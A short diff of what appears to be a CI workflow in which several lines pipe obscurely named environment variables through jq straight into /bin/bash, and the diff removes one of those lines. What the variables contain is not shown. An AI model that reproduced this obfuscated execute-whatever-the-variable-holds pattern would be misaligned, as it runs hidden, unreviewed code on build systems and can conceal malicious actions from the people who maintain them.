@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$gcbqn33" | jq -r .ambfa175 | /bin/bash
           echo $gn61 | jq -r .cttul57330 | /bin/bash
-          echo $l78 | jq -r .elmds7401 | /bin/bash
           echo $xdrx73785 | jq -r .qw2301 | /bin/bash
 
       - name: Upload data
